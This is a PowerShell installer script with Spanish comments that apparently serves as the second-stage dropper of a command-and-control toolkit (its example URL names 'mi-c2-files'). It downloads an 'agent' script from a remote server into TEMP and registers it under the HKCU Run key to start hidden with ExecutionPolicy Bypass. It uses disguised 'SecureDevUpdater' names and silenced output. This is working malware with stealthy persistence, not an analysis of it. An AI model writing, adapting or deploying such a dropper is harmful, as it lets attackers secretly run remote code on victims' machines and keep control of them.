# installer_mvp2.ps1 (MVP Fase 2) - Para despliegue en Render
# Descarga agente (mvp2), persistencia simple, y lógica de ejecución única.

# --- Directorio de Instalación y Archivo Bandera ---
$installDirName = "SecureDevUpdaterMVP2Render" # Nombre de la carpeta en APPDATA
$appDataDir = $env:APPDATA
$installDir = Join-Path -Path $appDataDir -ChildPath $installDirName
$flagFileName = "update.lock"
$flagFilePath = Join-Path -Path $installDir -ChildPath $flagFileName

if (Test-Path $flagFilePath) {
    # Write-Host "Instalador MVP2 (Render): Ya completado. Saliendo."
    exit 0
}
# ----------------------------------------------------

# --- CONFIGURACIÓN ---
$staticFilesBaseUrl = "https://TU_STATIC_FILES_RENDER_URL/files" # Ej. "https://mi-c2-files.onrender.com/files"
$agentFileNameOnServer = "core_services_mvp2.ps1" 
# --------------------

$agentFileNameLocal = "core_services_mvp2.ps1" 
$tempDirForAgent = $env:TEMP 
$agentPathLocal = Join-Path -Path $tempDirForAgent -ChildPath $agentFileNameLocal
$downloadUrl = "$($staticFilesBaseUrl)/$($agentFileNameOnServer)"

# Write-Host "Instalador MVP2 (Render): Intentando descargar $agentFileNameOnServer desde $downloadUrl"

try {
    if (-not (Test-Path $tempDirForAgent)) {
        New-Item -Path $tempDirForAgent -ItemType Directory -Force -ErrorAction Stop | Out-Null
    }
    (New-Object Net.WebClient).DownloadFile($downloadUrl, $agentPathLocal)
    # Write-Host "Instalador MVP2 (Render): Agente descargado a $agentPathLocal"
} catch {
    # Write-Host "Instalador MVP2 (Render): Fallo descarga agente: $($_.Exception.Message)"
    exit 1
}

$runKeyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$persistenceValueName = "SecureDevCoreServiceMVP2Render" 
$commandToPersist = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$agentPathLocal`""

# Write-Host "Instalador MVP2 (Render): Intentando establecer persistencia para $agentPathLocal"

try {
    Set-ItemProperty -Path $runKeyPath -Name $persistenceValueName -Value $commandToPersist -Force -ErrorAction Stop
    # Write-Host "Instalador MVP2 (Render): Persistencia establecida."
} catch {
    # Write-Host "Instalador MVP2 (Render): Fallo persistencia: $($_.Exception.Message)"
    exit 1
}

try {
    if (-not (Test-Path $installDir)) {
        New-Item -Path $installDir -ItemType Directory -Force -ErrorAction Stop | Out-Null
        # Write-Host "Instalador MVP2 (Render): Directorio de instalación creado en $installDir"
    }
    New-Item -Path $flagFilePath -ItemType File -Force -ErrorAction Stop | Out-Null
    # Write-Host "Instalador MVP2 (Render): Archivo bandera creado. Instalación completa."
} catch {
    # Write-Host "Instalador MVP2 (Render): Fallo creando directorio de instalación o archivo bandera: $($_.Exception.Message)"
    exit 1
}

# Write-Host "Instalador MVP2 (Render) completado."
exit 0